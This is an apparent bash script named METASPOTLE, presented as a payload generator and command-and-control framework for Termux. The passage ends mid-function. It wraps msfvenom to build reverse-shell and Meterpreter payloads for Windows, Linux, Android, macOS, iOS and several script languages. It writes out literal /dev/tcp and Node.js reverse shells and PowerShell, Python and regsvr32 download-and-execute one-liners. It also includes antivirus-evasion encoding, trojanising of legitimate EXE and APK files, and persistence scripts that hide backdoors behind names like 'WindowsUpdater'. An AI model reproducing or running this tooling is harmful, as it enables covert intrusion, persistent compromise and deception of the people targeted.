#!/bin/bash

#===============================================================================
# METASPOTLE - Ultimate Payload Generator & C2 Framework for Termux
# PART 1/3 - Core Functions, Menu, Windows & Linux Payloads
#===============================================================================

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; MAGENTA='\033[0;35m'; CYAN='\033[0;36m'; WHITE='\033[1;37m'
BOLD='\033[1m'; DIM='\033[2m'; NC='\033[0m'

banner() {
  clear
  echo -e "${RED}"
  echo '    __  ___      __            __    __        __       '
  echo '   /  |/  /___  / /____  _____/ /___/ /___  __/ /____ _ '
  echo '  / /|_/ / __ \/ __/ _ \/ ___/ / __  / __ \/ / __/ _ \ '
  echo ' / /  / / /_/ / /_/  __/ /  / / /_/ / /_/ / / /_/  __/ '
  echo '/_/  /_/\____/\__/\___/_/  /_/\__,_/\____/_/\__/\___/  '
  echo -e "${NC}"
  echo -e "${CYAN}══════════════════════════════════════════════════════════${NC}"
  echo -e "${GREEN}        Ultimate Payload Generator & C2 Framework${NC}"
  echo -e "${CYAN}══════════════════════════════════════════════════════════${NC}"
  echo ""
}

check_deps() {
  if ! command -v msfvenom &>/dev/null; then
    echo -e "${RED}[!] Metasploit Framework not found!${NC}"
    echo -e "${YELLOW}[*] Install: pkg install curl -y && source <(curl -fsSL https://raw.githubusercontent.com/gushmazuko/metasploit_in_termux/master/metasploit.sh)${NC}"
    read -p "Press [Enter] to exit..."
    exit 1
  fi
}

init_tracker() {
  mkdir -p $HOME/.metaspotle
  SESSION_FILE="$HOME/.metaspotle/sessions.log"
  PAYLOAD_DIR="$HOME/metaspotle_payloads"
  TOOL_DIR="$HOME/metaspotle_tools"
  mkdir -p "$PAYLOAD_DIR" "$TOOL_DIR"
  touch "$SESSION_FILE"
}

get_ip() {
  IP=$(ip -4 addr show 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v '127.0.0.1' | head -1)
  [ -z "$IP" ] && IP=$(ifconfig 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v '127.0.0.1' | head -1)
  [ -z "$IP" ] && IP=$(hostname -I 2>/dev/null | awk '{print $1}')
  [ -z "$IP" ] && IP="127.0.0.1"
  echo "$IP"
}

get_lhost_lport() {
  default_ip=$(get_ip)
  echo -e "${YELLOW}[?] LHOST (listener IP)${NC}"
  read -p "$(echo -e ${CYAN}"[>] LHOST (default: $default_ip): "${NC})" LHOST
  LHOST=${LHOST:-$default_ip}
  echo -e "${YELLOW}[?] LPORT (listener port)${NC}"
  read -p "$(echo -e ${CYAN}"[>] LPORT (default: 4444): "${NC})" LPORT
  LPORT=${LPORT:-4444}
}

log_payload() {
  echo "[$(date)] $1 | LHOST=$2 LPORT=$3 | FILE=$4 | SIZE=$5" >> "$SESSION_FILE"
}

show_file_info() {
  if [ -f "$1" ] && [ -s "$1" ]; then
    SIZE=$(du -h "$1" | cut -f1)
    echo -e "${GREEN}[OK] Payload generated!${NC}"
    echo -e "${WHITE}  File: ${GREEN}$1${NC}"
    echo -e "${WHITE}  Size: ${YELLOW}$SIZE${NC}"
    echo ""
    echo -e "${BOLD}HTTP share:${NC}"
    echo -e "${YELLOW}  cd $PAYLOAD_DIR && python3 -m http.server 8888${NC}"
    echo -e "${DIM}  http://$LHOST:8888/$(basename $1)${NC}"
    echo ""
    return 0
  else
    echo -e "${RED}[FAIL] Generation FAILED!${NC}"
    return 1
  fi
}

#======= WINDOWS EXE =======
gen_win_exe() {
  clear; banner; echo -e "${BLUE}[*] Windows EXE Payload${NC}"
  get_lhost_lport
  echo -e "${YELLOW}[?] Arch: [1] x86 [2] x64${NC}"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" arch
  echo -e "${YELLOW}[?] Type: [1] Meterpreter [2] Shell${NC}"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" type
  A="windows"; [ "$arch" == "2" ] && A="windows/x64"
  T="meterpreter/reverse_tcp"; [ "$type" == "2" ] && T="shell_reverse_tcp"
  FILENAME="windows_$(date +%s).exe"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  msfvenom -p ${A}/${T} LHOST=$LHOST LPORT=$LPORT -f exe -o "$OUTPUT" 2>/dev/null
  show_file_info "$OUTPUT" && log_payload "WIN-EXE" "$LHOST" "$LPORT" "$FILENAME" "$(du -h $OUTPUT | cut -f1)"
  read -p "$(echo -e ${DIM}"Press [Enter]...")"
}

#======= WINDOWS DLL =======
gen_win_dll() {
  clear; banner; echo -e "${BLUE}[*] Windows DLL Payload${NC}"
  get_lhost_lport
  echo -e "${YELLOW}[?] Arch: [1] x86 [2] x64${NC}"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" arch
  A="windows"; [ "$arch" == "2" ] && A="windows/x64"
  FILENAME="windows_dll_$(date +%s).dll"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  msfvenom -p ${A}/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f dll -o "$OUTPUT" 2>/dev/null
  show_file_info "$OUTPUT" && log_payload "WIN-DLL" "$LHOST" "$LPORT" "$FILENAME" "$(du -h $OUTPUT | cut -f1)"
  echo -e "${BOLD}Execute:${NC} regsvr32 /s $FILENAME"
  read -p "$(echo -e ${DIM}"Press [Enter]...")"
}

#======= WINDOWS POWERSHELL =======
gen_win_ps1() {
  clear; banner; echo -e "${BLUE}[*] Windows PowerShell Payload${NC}"
  get_lhost_lport
  FILENAME="powershell_$(date +%s).ps1"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f psh-reflection -o "$OUTPUT" 2>/dev/null
  show_file_info "$OUTPUT" && log_payload "WIN-PS1" "$LHOST" "$LPORT" "$FILENAME" "$(du -h $OUTPUT | cut -f1)"
  echo -e "${BOLD}Execute:${NC} powershell -ExecutionPolicy Bypass -File $FILENAME"
  read -p "$(echo -e ${DIM}"Press [Enter]...")"
}

#======= WINDOWS HTA =======
gen_win_hta() {
  clear; banner; echo -e "${BLUE}[*] Windows HTA Payload${NC}"
  get_lhost_lport
  FILENAME="payload_$(date +%s).hta"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f hta-psh -o "$OUTPUT" 2>/dev/null
  show_file_info "$OUTPUT" && log_payload "WIN-HTA" "$LHOST" "$LPORT" "$FILENAME" "$(du -h $OUTPUT | cut -f1)"
  echo -e "${BOLD}Send link:${NC} http://$LHOST:8888/$FILENAME"
  read -p "$(echo -e ${DIM}"Press [Enter]...")"
}

#======= WINDOWS VBA/MACRO =======
gen_win_vba() {
  clear; banner; echo -e "${BLUE}[*] Windows VBA/Macro Payload${NC}"
  get_lhost_lport
  echo -e "${YELLOW}[?] Format: [1] VBA [2] VBS${NC}"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" fmt
  F="vba"; [ "$fmt" == "2" ] && F="vbs"
  FILENAME="macro_$(date +%s).$F"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f $F -o "$OUTPUT" 2>/dev/null
  show_file_info "$OUTPUT" && log_payload "WIN-VBA" "$LHOST" "$LPORT" "$FILENAME" "$(du -h $OUTPUT | cut -f1)"
  echo -e "${BOLD}Paste into MS Office Macro editor${NC}"
  read -p "$(echo -e ${DIM}"Press [Enter]...")"
}

#======= WINDOWS MSI =======
gen_win_msi() {
  clear; banner; echo -e "${BLUE}[*] Windows MSI Payload${NC}"
  get_lhost_lport
  echo -e "${YELLOW}[?] Arch: [1] x86 [2] x64${NC}"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" arch
  A="windows"; [ "$arch" == "2" ] && A="windows/x64"
  FILENAME="installer_$(date +%s).msi"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  msfvenom -p ${A}/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f msi -o "$OUTPUT" 2>/dev/null
  show_file_info "$OUTPUT" && log_payload "WIN-MSI" "$LHOST" "$LPORT" "$FILENAME" "$(du -h $OUTPUT | cut -f1)"
  echo -e "${BOLD}Install:${NC} msiexec /quiet /qn /i $FILENAME"
  read -p "$(echo -e ${DIM}"Press [Enter]...")"
}

#======= LINUX ELF =======
gen_linux_elf() {
  clear; banner; echo -e "${GREEN}[*] Linux ELF Payload${NC}"
  get_lhost_lport
  echo -e "${YELLOW}[?] Arch: [1] x86 [2] x64 [3] ARM${NC}"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" arch
  case $arch in 1) P="linux/x86/meterpreter/reverse_tcp" ;; 2) P="linux/x64/meterpreter/reverse_tcp" ;; 3) P="linux/armle/meterpreter/reverse_tcp" ;; *) P="linux/x64/meterpreter/reverse_tcp" ;; esac
  FILENAME="linux_$(date +%s).elf"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  msfvenom -p $P LHOST=$LHOST LPORT=$LPORT -f elf -o "$OUTPUT" 2>/dev/null
  show_file_info "$OUTPUT" && chmod +x "$OUTPUT" && log_payload "LINUX-ELF" "$LHOST" "$LPORT" "$FILENAME" "$(du -h $OUTPUT | cut -f1)"
  read -p "$(echo -e ${DIM}"Press [Enter]...")"
}

#======= LINUX BASH =======
gen_linux_bash() {
  clear; banner; echo -e "${GREEN}[*] Linux Bash Reverse Shell${NC}"
  get_lhost_lport
  FILENAME="bash_$(date +%s).sh"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  msfvenom -p cmd/unix/reverse_bash LHOST=$LHOST LPORT=$LPORT -f raw -o "$OUTPUT" 2>/dev/null
  if [ ! -f "$OUTPUT" ] || [ ! -s "$OUTPUT" ]; then
    cat > "$OUTPUT" << EOF
#!/bin/bash
bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
EOF
  fi
  chmod +x "$OUTPUT"
  show_file_info "$OUTPUT" && log_payload "LINUX-BASH" "$LHOST" "$LPORT" "$FILENAME" "$(du -h $OUTPUT | cut -f1)"
  echo -e "${BOLD}Execute:${NC} bash $FILENAME"
  read -p "$(echo -e ${DIM}"Press [Enter]...")"
}

#======= ANDROID APK =======
gen_android_apk() {
  clear; banner; echo -e "${MAGENTA}[*] Android APK Payload${NC}"
  get_lhost_lport
  echo -e "${YELLOW}[?] Bind to legit APK? (y/n)${NC}"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" bind_choice
  FILENAME="android_$(date +%s).apk"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  if [[ "$bind_choice" == "y" ]]; then
    read -p "$(echo -e ${CYAN}"[>] Path to APK: "${NC})" TEMPLATE_APK
    [ -f "$TEMPLATE_APK" ] && msfvenom -x "$TEMPLATE_APK" -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o "$OUTPUT" &>/dev/null || msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT R > "$OUTPUT" 2>/dev/null
  else
    msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT R > "$OUTPUT" 2>/dev/null
  fi
  show_file_info "$OUTPUT" && log_payload "ANDROID" "$LHOST" "$LPORT" "$FILENAME" "$(du -h $OUTPUT | cut -f1)"
  command -v jarsigner &>/dev/null && [ -f "$HOME/.android/debug.keystore" ] && jarsigner -keystore $HOME/.android/debug.keystore -storepass android -keypass android "$OUTPUT" androiddebugkey &>/dev/null && echo -e "${GREEN}[OK] Signed${NC}" || echo -e "${YELLOW}[!] Enable unknown sources on target${NC}"
  read -p "$(echo -e ${DIM}"Press [Enter]...")"
}

#======= macOS MACHO =======
gen_macos_macho() {
  clear; banner; echo -e "${MAGENTA}[*] macOS Mach-O Payload${NC}"
  get_lhost_lport
  echo -e "${YELLOW}[?] Arch: [1] x86 [2] x64${NC}"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" arch
  P="osx/x86/shell_reverse_tcp"; [ "$arch" == "2" ] && P="osx/x64/meterpreter/reverse_tcp"
  FILENAME="macos_$(date +%s).macho"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  msfvenom -p $P LHOST=$LHOST LPORT=$LPORT -f macho -o "$OUTPUT" 2>/dev/null
  show_file_info "$OUTPUT" && chmod +x "$OUTPUT" && log_payload "MACOS" "$LHOST" "$LPORT" "$FILENAME" "$(du -h $OUTPUT | cut -f1)"
  read -p "$(echo -e ${DIM}"Press [Enter]...")"
}

#======= macOS PKG =======
gen_macos_pkg() {
  clear; banner; echo -e "${MAGENTA}[*] macOS PKG Payload${NC}"
  get_lhost_lport
  echo -e "${YELLOW}[*] Creating PKG wrapper...${NC}"
  PKGDIR="$TOOL_DIR/macos_pkg_$(date +%s)"
  mkdir -p "$PKGDIR/scripts"
  cat > "$PKGDIR/scripts/postinstall" << EOF
#!/bin/bash
bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1 &
EOF
  chmod +x "$PKGDIR/scripts/postinstall"
  FILENAME="macos_installer_$(date +%s).pkg"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f macho -o "$PKGDIR/payload.bin" 2>/dev/null
  if [ -f "$PKGDIR/payload.bin" ]; then
    cd "$PKGDIR" && tar czf "$OUTPUT" . 2>/dev/null && cd "$HOME"
    show_file_info "$OUTPUT" && log_payload "MACOS-PKG" "$LHOST" "$LPORT" "$FILENAME" "$(du -h $OUTPUT | cut -f1)"
  else
    echo -e "${RED}[FAIL]${NC}"
  fi
  rm -rf "$PKGDIR"
  read -p "$(echo -e ${DIM}"Press [Enter]...")"
}

#======= iOS =======
gen_ios() {
  clear; banner; echo -e "${CYAN}[*] iOS Payload (jailbroken only)${NC}"
  get_lhost_lport
  echo -e "${YELLOW}[?] Type: [1] arm64 TCP [2] armle TCP [3] arm64 HTTPS${NC}"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" ios_type
  case $ios_type in 1) P="apple_ios/aarch64/meterpreter/reverse_tcp" ;; 2) P="apple_ios/armle/shell_reverse_tcp" ;; 3) P="apple_ios/aarch64/meterpreter/reverse_https" ;; *) P="apple_ios/aarch64/meterpreter/reverse_tcp" ;; esac
  FILENAME="iphone_$(date +%s).macho"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  msfvenom -p $P LHOST=$LHOST LPORT=$LPORT -f macho -o "$OUTPUT" 2>/dev/null
  if [ ! -f "$OUTPUT" ] || [ ! -s "$OUTPUT" ]; then
    msfvenom -p osx/arm64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f macho -o "$OUTPUT" 2>/dev/null
  fi
  show_file_info "$OUTPUT" && chmod +x "$OUTPUT" && log_payload "IOS" "$LHOST" "$LPORT" "$FILENAME" "$(du -h $OUTPUT | cut -f1)"
  read -p "$(echo -e ${DIM}"Press [Enter]...")"
}

#======= PHP =======
gen_php() {
  clear; banner; echo -e "${YELLOW}[*] PHP Reverse Shell${NC}"
  get_lhost_lport
  FILENAME="php_$(date +%s).php"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw -o "$OUTPUT" 2>/dev/null
  show_file_info "$OUTPUT" && log_payload "PHP" "$LHOST" "$LPORT" "$FILENAME" "$(du -h $OUTPUT | cut -f1)"
  read -p "$(echo -e ${DIM}"Press [Enter]...")"
}

#======= PYTHON =======
gen_python() {
  clear; banner; echo -e "${BLUE}[*] Python Payload${NC}"
  get_lhost_lport
  FILENAME="python_$(date +%s).py"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  msfvenom -p python/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw -o "$OUTPUT" 2>/dev/null
  show_file_info "$OUTPUT" && log_payload "PYTHON" "$LHOST" "$LPORT" "$FILENAME" "$(du -h $OUTPUT | cut -f1)"
  echo -e "${BOLD}Execute:${NC} python3 $FILENAME"
  read -p "$(echo -e ${DIM}"Press [Enter]...")"
}

#======= NODE.JS =======
gen_nodejs() {
  clear; banner; echo -e "${GREEN}[*] Node.js Payload${NC}"
  get_lhost_lport
  FILENAME="nodejs_$(date +%s).js"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  cat > "$OUTPUT" << EOF
(function(){
  var net=require('net'),cp=require('child_process'),sh=cp.spawn('/bin/sh',[]);
  var c=new net.Socket();c.connect($LPORT,'$LHOST',function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});
  return /a/;
})();
EOF
  show_file_info "$OUTPUT" && log_payload "NODEJS" "$LHOST" "$LPORT" "$FILENAME" "$(du -h $OUTPUT | cut -f1)"
  echo -e "${BOLD}Execute:${NC} node $FILENAME"
  read -p "$(echo -e ${DIM}"Press [Enter]...")"
}

#======= JAVA JAR =======
gen_java_jar() {
  clear; banner; echo -e "${YELLOW}[*] Java JAR Payload${NC}"
  get_lhost_lport
  echo -e "${YELLOW}[?] Arch: [1] x86 [2] x64${NC}"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" arch
  P="java/shell_reverse_tcp"; [ "$arch" == "2" ] && P="java/x64/shell_reverse_tcp"
  FILENAME="java_$(date +%s).jar"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  msfvenom -p $P LHOST=$LHOST LPORT=$LPORT -f jar -o "$OUTPUT" 2>/dev/null
  show_file_info "$OUTPUT" && log_payload "JAVA" "$LHOST" "$LPORT" "$FILENAME" "$(du -h $OUTPUT | cut -f1)"
  echo -e "${BOLD}Execute:${NC} java -jar $FILENAME"
  read -p "$(echo -e ${DIM}"Press [Enter]...")"
}

#======= WEB DELIVERY =======
gen_web_delivery() {
  clear; banner; echo -e "${CYAN}[*] Web Delivery One-Liner${NC}"
  get_lhost_lport
  echo -e "${YELLOW}[?] Target: [1] PowerShell [2] Python [3] PHP [4] Regsvr32${NC}"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" wd
  case $wd in
    1) echo -e "${GREEN}PS one-liner:${NC}"
       echo -e "${YELLOW}powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).downloadString('http://$LHOST:8888/payload.ps1')\"${NC}" ;;
    2) echo -e "${GREEN}Python one-liner:${NC}"
       echo -e "${YELLOW}python3 -c \"import urllib.request;exec(urllib.request.urlopen('http://$LHOST:8888/payload.py').read())\"${NC}" ;;
    3) echo -e "${GREEN}PHP one-liner:${NC}"
       echo -e "${YELLOW}php -r \"file_get_contents('http://$LHOST:8888/payload.php');\"${NC}" ;;
    4) echo -e "${GREEN}Regsvr32 one-liner:${NC}"
       echo -e "${YELLOW}regsvr32 /u /n /s /i:http://$LHOST:8888/payload.sct scrobj.dll${NC}" ;;
  esac
  echo -e "${BOLD}Host:${NC} cd $PAYLOAD_DIR && python3 -m http.server 8888"
  read -p "$(echo -e ${DIM}"Press [Enter]...")"
}

# Save this as part1, then source into main
export -f banner check_deps init_tracker get_ip get_lhost_lport log_payload show_file_info
export -f gen_win_exe gen_win_dll gen_win_ps1 gen_win_hta gen_win_vba gen_win_msi
export -f gen_linux_elf gen_linux_bash gen_android_apk gen_macos_macho gen_macos_pkg
export -f gen_ios gen_php gen_python gen_nodejs gen_java_jar gen_web_delivery
export SESSION_FILE PAYLOAD_DIR TOOL_DIR
#!/bin/bash

#===============================================================================
# METASPOTLE - PART 2/3 - Listeners, Encoding, Injection, Persistence
#===============================================================================

#======= MULTI-HANDLER LISTENER =======
start_multi_handler() {
  clear; banner
  echo -e "${CYAN}╔═════════════════════════════════════════════╗${NC}"
  echo -e "${CYAN}║         ${WHITE}MULTI-HANDLER LISTENER${CYAN}               ║${NC}"
  echo -e "${CYAN}╚═════════════════════════════════════════════╝${NC}"
  echo ""
  default_ip=$(get_ip)
  read -p "$(echo -e ${CYAN}"[>] LHOST (default: $default_ip): "${NC})" L_HOST
  L_HOST=${L_HOST:-$default_ip}
  read -p "$(echo -e ${CYAN}"[>] LPORT (default: 4444): "${NC})" L_PORT
  L_PORT=${L_PORT:-4444}
  echo ""
  echo -e "${YELLOW}[?] Payload:${NC}"
  echo -e "  [1] android  [2] windows  [3] linux  [4] osx  [5] php  [6] python  [7] java  [8] ios  [9] custom"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" ht
  case $ht in
    1) PAYLOAD="android/meterpreter/reverse_tcp" ;;
    2) PAYLOAD="windows/x64/meterpreter/reverse_tcp" ;;
    3) PAYLOAD="linux/x64/meterpreter/reverse_tcp" ;;
    4) PAYLOAD="osx/x64/meterpreter/reverse_tcp" ;;
    5) PAYLOAD="php/reverse_php" ;;
    6) PAYLOAD="python/meterpreter/reverse_tcp" ;;
    7) PAYLOAD="java/meterpreter/reverse_tcp" ;;
    8) PAYLOAD="apple_ios/aarch64/meterpreter/reverse_tcp" ;;
    9) read -p "$(echo -e ${CYAN}"[>] Custom: "${NC})" PAYLOAD ;;
    *) PAYLOAD="windows/x64/meterpreter/reverse_tcp" ;;
  esac
  echo ""
  echo -e "${GREEN}[+] LHOST: $L_HOST | LPORT: $L_PORT | $PAYLOAD${NC}"
  echo -e "${RED}╔══════════════════════════════════════════════╗${NC}"
  echo -e "${RED}║  ${WHITE}Waiting for target... Ctrl+C to stop${RED}     ║${NC}"
  echo -e "${RED}╚══════════════════════════════════════════════╝${NC}"
  echo ""
  RC_FILE="$HOME/.metaspotle/handler_${L_PORT}.rc"
  cat > "$RC_FILE" << EOF
use exploit/multi/handler
set PAYLOAD $PAYLOAD
set LHOST $L_HOST
set LPORT $L_PORT
set ExitOnSession false
set SessionTimeout 0
set WaitForSession true
exploit -j -z
EOF
  sleep 1; msfconsole -q -r "$RC_FILE"
  echo -e "${YELLOW}[?] Open msfconsole? (y/n)${NC}"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" ans
  [[ "$ans" == "y" ]] && msfconsole -q
  read -p "$(echo -e ${DIM}"Press [Enter]...")"
}

#======= BIND SHELL LISTENER =======
start_bind_handler() {
  clear; banner
  echo -e "${CYAN}╔═════════════════════════════════════════════╗${NC}"
  echo -e "${CYAN}║         ${WHITE}BIND SHELL LISTENER${CYAN}                  ║${NC}"
  echo -e "${CYAN}╚═════════════════════════════════════════════╝${NC}"
  echo ""
  read -p "$(echo -e ${CYAN}"[>] RHOST: "${NC})" RHOST
  read -p "$(echo -e ${CYAN}"[>] RPORT (default: 4444): "${NC})" RPORT
  RPORT=${RPORT:-4444}
  echo -e "${YELLOW}[?] Target OS: [1] Windows [2] Linux${NC}"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" os_type
  PAYLOAD="linux/x64/shell_bind_tcp"; [ "$os_type" == "1" ] && PAYLOAD="windows/x64/shell_bind_tcp"
  echo -e "${GREEN}[+] Connecting to $RHOST:$RPORT${NC}"
  RC_FILE="$HOME/.metaspotle/bind_${RPORT}.rc"
  cat > "$RC_FILE" << EOF
use exploit/multi/handler
set PAYLOAD $PAYLOAD
set RHOST $RHOST
set RPORT $RPORT
set ExitOnSession false
exploit -j -z
EOF
  sleep 1; msfconsole -q -r "$RC_FILE"
  read -p "$(echo -e ${DIM}"Press [Enter]...")"
}

#======= ENCODE PAYLOAD =======
encode_payload() {
  clear; banner; echo -e "${YELLOW}[*] Payload Encoding & AV Evasion${NC}"
  echo ""
  echo -e "${YELLOW}[?] Base payload: [1] Win x64 [2] Win x86 [3] Linux x64 [4] Custom${NC}"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" base_p
  case $base_p in
    1) B="windows/x64/meterpreter/reverse_tcp"; F="exe" ;;
    2) B="windows/meterpreter/reverse_tcp"; F="exe" ;;
    3) B="linux/x64/meterpreter/reverse_tcp"; F="elf" ;;
    4) read -p "$(echo -e ${CYAN}"[>] Base: "${NC})" B; read -p "$(echo -e ${CYAN}"[>] Format: "${NC})" F ;;
    *) B="windows/x64/meterpreter/reverse_tcp"; F="exe" ;;
  esac
  get_lhost_lport
  echo -e "${YELLOW}[?] Iterations (1-20, default 5):${NC}"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" ITER; ITER=${ITER:-5}
  echo -e "${YELLOW}[?] Encoder: [1] shikata_ga_nai [2] xor${NC}"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" enc
  ENC="x86/shikata_ga_nai"; [ "$enc" == "2" ] && ENC="x86/xor"
  FILENAME="encoded_$(date +%s).$F"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  echo -e "${YELLOW}[*] Encoding ${ITER}x with $ENC...${NC}"
  msfvenom -p $B LHOST=$LHOST LPORT=$LPORT -e $ENC -i $ITER -f $F -o "$OUTPUT" 2>/dev/null
  show_file_info "$OUTPUT" && log_payload "ENCODED" "$LHOST" "$LPORT" "$FILENAME" "$(du -h $OUTPUT | cut -f1)"
  echo -e "${YELLOW}[!] Encoding evades signature-based AV, not behavioral${NC}"
  read -p "$(echo -e ${DIM}"Press [Enter]...")"
}

#======= INJECT INTO EXE =======
inject_payload() {
  clear; banner; echo -e "${BLUE}[*] Inject Payload into Legitimate EXE${NC}"
  echo ""
  read -p "$(echo -e ${CYAN}"[>] Path to legit .exe: "${NC})" LEGIT_EXE
  [ ! -f "$LEGIT_EXE" ] && echo -e "${RED}[!] Not found${NC}" && read -p "$(echo -e ${DIM}"Press [Enter]...")" && return
  get_lhost_lport
  echo -e "${YELLOW}[?] Arch: [1] x86 [2] x64${NC}"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" arch
  A="windows"; [ "$arch" == "2" ] && A="windows/x64"
  FILENAME="injected_$(basename $LEGIT_EXE)"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  msfvenom -p ${A}/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -x "$LEGIT_EXE" -k -f exe -o "$OUTPUT" 2>/dev/null
  show_file_info "$OUTPUT" && log_payload "INJECTED" "$LHOST" "$LPORT" "$FILENAME" "$(du -h $OUTPUT | cut -f1)"
  echo -e "${GREEN}[+] Original program still works normally${NC}"
  read -p "$(echo -e ${DIM}"Press [Enter]...")"
}

#======= PERSISTENT BACKDOOR =======
persistent_backdoor() {
  clear; banner; echo -e "${RED}[*] Create Persistent Backdoor${NC}"
  echo ""
  get_lhost_lport
  echo -e "${YELLOW}[?] Target: [1] Windows [2] Linux [3] Android${NC}"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" plat
  FILENAME="persistent_$(date +%s).sh"
  OUTPUT="$PAYLOAD_DIR/$FILENAME"
  case $plat in
    1)
      EXE_FILE="$PAYLOAD_DIR/backdoor_$(date +%s).exe"
      msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o "$EXE_FILE" 2>/dev/null
      cat > "$OUTPUT" << EOF
@echo off
copy "$EXE_FILE" C:\Windows\backdoor.exe
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsUpdater /t REG_SZ /d "C:\Windows\backdoor.exe" /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsUpdater /t REG_SZ /d "C:\Windows\backdoor.exe" /f
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\backdoor.exe" /sc onlogon /f
echo Backdoor installed
EOF
      echo -e "${GREEN}[OK] EXE + persistence script created${NC}"
      log_payload "PERSIST-WIN" "$LHOST" "$LPORT" "backdoor_*.exe" ""
      ;;
    2)
      cat > "$OUTPUT" << EOF
#!/bin/bash
echo "*/5 * * * * root bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'" >> /etc/crontab
cat > /etc/systemd/system/update.service << 'SERV'
[Unit]
Description=Update
[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'
Restart=always
RestartSec=60
[Install]
WantedBy=multi-user.target
SERV
systemctl enable update.service && systemctl start update.service
echo "bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1 &'" >> /etc/bash.bashrc
echo "Persistence installed"
EOF
      chmod +x "$OUTPUT"
      echo -e "${GREEN}[OK] Linux persistence script created${NC}"
      log_payload "PERSIST-LINUX" "$LHOST" "$LPORT" "$FILENAME" ""
      ;;
    3)
      cat > "$OUTPUT" << EOF
#!/system/bin/sh
cp /data/local/tmp/payload.apk /system/app/SystemUpdate.apk
chmod 644 /system/app/SystemUpdate.apk
cat > /system/etc/init.d/99backdoor << 'INIT'
#!/system/bin/sh
am startservice -n com.metasploit.stage/.MainService
sleep 30
am startservice -n com.metasploit.stage/.MainService
INIT
chmod 755 /system/etc/init.d/99backdoor
echo "Android persistence installed (root required)"
EOF
      echo -e "${GREEN}[OK] Android persistence script created${NC}"
      log_payload "PERSIST-ANDROID" "$LHOST" "$LPORT" "$FILENAME" ""
      ;;
  esac
  echo -e "${BOLD}Output:${NC} $OUTPUT"
  read -p "$(echo -e ${DIM}"Press [Enter]...")"
}

#======= GENERATE SHELLCODE =======
gen_shellcode() {
  clear; banner; echo -e "${BLUE}[*] Generate Shellcode${NC}"
  echo ""
  get_lhost_lport
  echo -e "${YELLOW}[?] Arch: [1] x86 [2] x64${NC}"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" arch
  echo -e "${YELLOW}[?] Format: [1] C [2] Python [3] Ruby [4] Base64 [5] Hex [6] Raw${NC}"
  read -p "$(echo -e ${CYAN}"[>] "${NC})" fmt
  A="linux/x86"; [ "$arch" == "2" ] && A="linux/x64"
  case $fmt in
    1) F="c"; EXT="c" ;; 2) F="py"; EXT="py" ;; 3) F="rb"; EXT="rb" ;;
    4) F="base64"; EXT="b64" ;; 5) F="hex"; EXT="hex" ;; 6) F="raw"; EXT="bin" ;;
